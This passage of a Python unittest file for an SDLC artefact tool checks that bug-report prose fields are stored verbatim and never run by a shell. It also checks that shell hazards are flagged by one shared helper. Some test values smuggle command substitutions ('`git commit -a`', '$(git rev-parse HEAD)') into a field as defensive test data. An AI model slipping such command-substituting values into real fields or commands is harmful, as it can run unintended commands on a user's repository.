            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            payload = STEPS_PAYLOAD.format(sentinel=repo / "EXECUTED")
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "bug", "--fields-file",
                                    str(self._spec(repo, payload)), "--root", str(repo)])
            self.assertEqual(rc, 0)
            body = self._created(repo).read_text(encoding="utf-8")
            self.assertIn(payload, body)          # every character, in one contiguous run
            self.assertIn("`git commit -a`", body)
            self.assertIn("$(git rev-parse HEAD)", body)

    def test_creating_that_payload_leaves_head_and_the_index_untouched(self) -> None:
        import contextlib
        import io
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _git_repo(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            sentinel = repo / "EXECUTED"
            payload = STEPS_PAYLOAD.format(sentinel=sentinel)
            spec = self._spec(repo, payload)
            before = _git_state(repo)
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "bug", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertEqual(rc, 0)
            self.assertEqual(_git_state(repo), before)
            self.assertFalse(sentinel.exists())

    def test_an_unknown_key_is_refused_here_too(self) -> None:
        import contextlib
        import io
        import json
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            spec = repo / "finding.json"
            spec.write_text(json.dumps({"title": "t", "severity": "High", "summary": "s",
                                        "steps": "x", "fix": "y", "stpes": "typo",
                                        "affects": "src/thing.py", "points": 3}),
                            encoding="utf-8")
            err = io.StringIO()
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
                rc = artifact.main(["new", "--type", "bug", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            self.assertIn("stpes", err.getvalue())

    def test_a_story_can_carry_its_own_fields_in_the_document(self) -> None:
        # The allowed keys are per-writer: `artifact new` also takes an epic, a persona and
        # verifiers, and refusing them here would make the safe path unusable for a story.
        import contextlib
        import io
        import json
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            spec = repo / "story.json"
            spec.write_text(json.dumps({"title": "do a thing", "epic": "EP0001",
                                        "summary": "s", "points": 3}), encoding="utf-8")
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "story", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertEqual(rc, 0)


class SharedHazardHelperTests(unittest.TestCase):
    """US0306 AC2: ONE hazard implementation, called by both writers. Two copies of a pattern
    list drift, and a drifted list is the silent half of this defect all over again."""

    def _flag_create(self, repo: Path, steps: str) -> str:
        import contextlib
        import io
        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
            artifact.main(["new", "--type", "bug", "--title", "a defect", "--severity", "High",
                           "--summary", "s", "--steps", steps, "--fix", "y",
                           "--affects", "src/thing.py", "--points", "3", "--root", str(repo)])
        return err.getvalue()

    def _flag_file(self, repo: Path, steps: str) -> str:
        import contextlib
        import io
        import file_finding
        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
            file_finding.main(["file", "--type", "bug", "--title", "a defect",
                               "--severity", "High", "--summary", "s", "--steps", steps,
                               "--fix", "y", "--affects", "src/thing.py", "--points", "3",
                               "--root", str(repo)])
        return err.getvalue()

    def test_both_writers_report_the_same_field_with_the_same_wording(self) -> None:
        steps = "run `git status and read it"
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            via_artifact = self._flag_create(repo, steps)
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            via_filer = self._flag_file(repo, steps)
        self.assertTrue(via_artifact.strip())
        self.assertEqual(via_artifact, via_filer)   # same helper, so byte-identical

    def test_the_helper_has_one_home_and_the_creator_borrows_it(self) -> None:
        # By SOURCE FILE, not by object identity: a sibling suite that reloads `file_finding`
        # rebinds the module object, and an identity assertion would then fail for a reason
        # that has nothing to do with where the helper lives.
        import inspect
        for fn in (artifact.file_finding.shell_hazards,
                   artifact.file_finding.report_shell_hazards):
            self.assertEqual(Path(inspect.getsourcefile(fn)).name, "file_finding.py")
        # ...and the creator keeps no copy of its own to drift from that one
        self.assertFalse(hasattr(artifact, "shell_hazards"))
        self.assertFalse(hasattr(artifact, "report_shell_hazards"))

    def test_every_hazard_shape_is_reported_by_both(self) -> None:
        for steps in ("run `git status and read it", "capture $(git rev-parse HEAD)",
                      "continue the command \\"):
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
                a = self._flag_create(repo, steps)
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
                f = self._flag_file(repo, steps)
            self.assertTrue(a.strip(), steps)
            self.assertEqual(a, f, steps)


#: The writers that HAVE the non-shell input path. Adding a writer here without the flag fails
#: the sweep, and so does adding a prose writer to `scripts/` that appears in neither list.
SAFE_INPUT_WRITERS = {"file_finding.py", "artifact.py",
                      # gained --fields-file (shared file_finding.resolve_prose_fields loader):
                      "critic.py", "close_owed.py", "sprint.py"}

#: The sibling prose writers the sweep found and could NOT reach in this batch, each with the
#: reason. D0052 ruled the sweep WIDER than the two files CR0384 names, and these four carry the
#: same free-prose flags for the same reason - they are recorded here, named, rather than the
#: sweep being quietly narrowed to the two that were convenient. Each is owned by another unit's
#: file scope in this batch, so the fix is a follow-up; this list is what makes that visible.
#: Emptying an entry is the point: when a writer gains `--fields-file`, delete its line here.
KNOWN_PROSE_WRITER_GAPS = {
    "telemetry.py": "its only _PROSE_FLAGS match is `show --summary`, a store_true BOOLEAN, not "
                    "free prose - it carries no shell hazard. The earlier 'note prose on the "
                    "command line' reason was wrong: telemetry has no narrative flag. Recorded "
                    "here as safe-by-nature (like mutation.py) rather than given a --fields-file "
                    "for prose that does not exist.",
    "mutation.py": "its only free-prose flag is `window open --note`, a short operator label "
                   "written to transient .local state rather than into an artefact body, so it "
                   "is outside the filing hazard - recorded here rather than quietly dropped "
                   "from the enumeration",
}

#: A flag whose value is free prose an author writes - the shape that carries the hazard. An
#: enum, a path or an id does not: a shell metacharacter in `--status Done` is a typo, not a
#: swallowed command.
_PROSE_FLAGS = ("--steps", "--fix", "--summary", "--impact", "--note", "--goal")


def _parser_options(parser) -> set[str]:
    """Every option string an argparse parser accepts, walking into its subparsers."""
    import argparse as _ap
    out: set[str] = set()
    for action in parser._actions:
        out.update(action.option_strings)
        if isinstance(action, _ap._SubParsersAction):
            for sub in action.choices.values():
                out |= _parser_options(sub)
    return out


class ProseWriterSweepTests(unittest.TestCase):
    """US0306 AC3: the sweep is ENUMERATED, not grepped once by hand. A writer added later with
    free-prose flags and no non-shell path FAILS this test, rather than being discovered by the
    next silent truncation."""

    def _prose_writers(self) -> dict[str, str]:
        """script name -> source, for every script exposing a free-prose flag."""
        import re as _re
        found: dict[str, str] = {}
        for path in sorted(SCR.glob("*.py")):
            try:
                src = path.read_text(encoding="utf-8")
            except (OSError, UnicodeDecodeError):
                continue
            if any(_re.search(rf'add_argument\(\s*"{_re.escape(flag)}"', src)
                   for flag in _PROSE_FLAGS):
                found[path.name] = src
        return found

    def test_the_enumeration_finds_something_to_judge(self) -> None:
        # A sweep that enumerated nothing would pass vacuously, which is the failure mode this
        # whole test exists to refuse elsewhere.
        writers = self._prose_writers()
        self.assertTrue(writers)
        for name in SAFE_INPUT_WRITERS:
            self.assertTrue(name in writers, f"{name} no longer exposes a free-prose flag")

    def test_every_prose_writer_is_either_safe_or_a_named_gap(self) -> None:
        unaccounted = sorted(set(self._prose_writers())
                             - SAFE_INPUT_WRITERS - set(KNOWN_PROSE_WRITER_GAPS))
        self.assertEqual(
            unaccounted, [],
            "these scripts take free prose on the command line with no non-shell input path "
            f"and no recorded reason: {unaccounted}. Give them `--fields-file` (see "
            "file_finding.load_fields_file), or record why not in KNOWN_PROSE_WRITER_GAPS")

    def test_the_four_cr0392_writers_are_now_safe(self) -> None:
        """US0392 AC3: none of the four deferred writers remains a DEFERRED gap. Three genuinely
        took prose and gained `--fields-file` (now SAFE_INPUT_WRITERS); telemetry took no prose
        (its `--summary` is a boolean) and is reclassified safe-by-nature, not deferred."""
        for name in ("critic.py", "close_owed.py", "sprint.py"):
            self.assertIn(name, SAFE_INPUT_WRITERS, f"{name} should have a non-shell input path")
        # telemetry stays a named gap, but as safe-by-nature, NOT a deferred one
        self.assertIn("telemetry.py", KNOWN_PROSE_WRITER_GAPS)
        for name in ("critic.py", "close_owed.py", "sprint.py", "telemetry.py"):
            reason = KNOWN_PROSE_WRITER_GAPS.get(name, "")
            self.assertNotIn("deferred", reason,
                             f"{name} is still recorded as a deferred gap; it should be resolved")

    def _options_of(self, name: str) -> set[str]:
        """Every flag the script's own PARSER accepts, subcommands included.

        Asked of the parser, never of the source text: a grep for the flag name is satisfied by
        a help string or an error message that merely MENTIONS it, so a writer that renamed its
        safe path would still read as safe."""
        spec = importlib.util.spec_from_file_location(f"_sweep_{name[:-3]}", SCR / name)
        mod = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = mod
        spec.loader.exec_module(mod)
        return _parser_options(mod.build_parser())

    def test_every_safe_writer_really_offers_the_path(self) -> None:
        for name in sorted(SAFE_INPUT_WRITERS):
            self.assertIn("--fields-file", self._options_of(name),
                          f"{name} is listed as safe but its parser accepts no --fields-file")

    def test_a_gap_that_has_been_closed_must_leave_the_list(self) -> None:
        # The list records what is OWED. An entry that is no longer true is a debt nobody will
        # ever pay off, because nothing says it was paid.
        stale = sorted(n for n in KNOWN_PROSE_WRITER_GAPS
                       if "--fields-file" in self._options_of(n))
        self.assertEqual(stale, [],
                         f"{stale} now offer --fields-file - move them to SAFE_INPUT_WRITERS")

    def test_each_recorded_gap_names_a_reason(self) -> None:
        for name, why in KNOWN_PROSE_WRITER_GAPS.items():
            self.assertTrue(why.strip(), name)
            self.assertTrue(name in self._prose_writers(),
                            f"{name} is recorded as a gap but exposes no free-prose flag - "
                            "delete the entry rather than leaving a claim nothing checks")


class AffectsValidatedAtMintTests(unittest.TestCase):
    """US0324: `artifact new` refuses a declared `Affects` that resolves to nothing BEFORE an id
    is allocated - minting nothing - while a path to a file the unit will CREATE stays legitimate,
    and a recorded grooming opt-out downgrades the refusal to a warning."""

    def _story_repo(self) -> tuple[Path, tempfile.TemporaryDirectory]:
        td = tempfile.TemporaryDirectory()
        repo = Path(td.name)
        _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
        _epic(repo)
        return repo, td

    def test_new_refuses_an_unresolvable_affects_and_allocates_no_id(self) -> None:
        repo, td = self._story_repo()
        with td:
            idx = repo / "sdlc-studio" / "stories" / "_index.md"
            before = idx.read_text(encoding="utf-8")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "wrong path",
                             {"epic": "EP0001", "points": 3, "affects": "ghost/nope.py"})
            self.assertIn("resolves to nothing", str(cm.exception))
            # nothing written: no story file, the index byte-identical
            stories = [p for p in (repo / "sdlc-studio" / "stories").glob("*.md")
                       if p.name != "_index.md"]
            self.assertEqual(stories, [])
            self.assertEqual(idx.read_text(encoding="utf-8"), before)
            # ... and no id burnt: the next SUCCESSFUL mint takes US0001, the refused call's id
            ok = artifact.new(repo, "story", "real path",
                              {"epic": "EP0001", "points": 3, "affects": "src/thing.py"})
            self.assertEqual(ok["id"], "US0001")

    def test_a_partly_unresolvable_affects_still_mints(self) -> None:
        # One existing file + one the unit will CREATE is the ordinary case; the check refuses
        # only when NO declared path resolves. Verified through artifact.new AND refine.apply.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            affects = "src/thing.py, src/not-written-yet.py"
            r = artifact.new(repo, "story", "half new",
                             {"epic": "EP0001", "points": 3, "affects": affects})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertEqual(sdlc_md.affects_files(body),
                             ["src/thing.py", "src/not-written-yet.py"])  # stored verbatim
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio" / "change-requests").mkdir(parents=True)
            (repo / "src").mkdir()
            (repo / "src" / "thing.py").write_text("", encoding="utf-8")
            (repo / "sdlc-studio" / "change-requests" / "CR0001-x.md").write_text(
                "# CR-0001: t\n\n> **Status:** Approved\n> **Priority:** P1\n"
                "> **Type:** Improvement\n> **Size:** L\n\n## Summary\n\ns\n\n## Impact\n\ni\n",
                encoding="utf-8")
            refine = __import__("refine")
            res = refine.refine(repo, "CR0001", "E",
                                [("S", 3, "src/thing.py, src/not-written-yet.py")],
                                skip_personas=True)
            story = sdlc_md.find_by_id(repo, res["stories"][0])[0]
            self.assertEqual(sdlc_md.affects_files(story.read_text(encoding="utf-8")),
                             ["src/thing.py", "src/not-written-yet.py"])

    def test_the_recorded_opt_out_downgrades_the_refusal_to_a_warning(self) -> None:
        import contextlib
        import io
        repo, td = self._story_repo()
        with td:
            (repo / "sdlc-studio" / ".config.yaml").write_text(
                "sprint:\n  breakdown: judgement\n", encoding="utf-8")
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                r = artifact.new(repo, "story", "opted out",
                                 {"epic": "EP0001", "points": 3, "affects": "ghost/nope.py"})
            self.assertTrue(Path(r["path"]).exists())          # minted: the operator opted out
            self.assertIn("resolves to nothing", err.getvalue())  # ... but never quietly


if __name__ == "__main__":
    unittest.main()
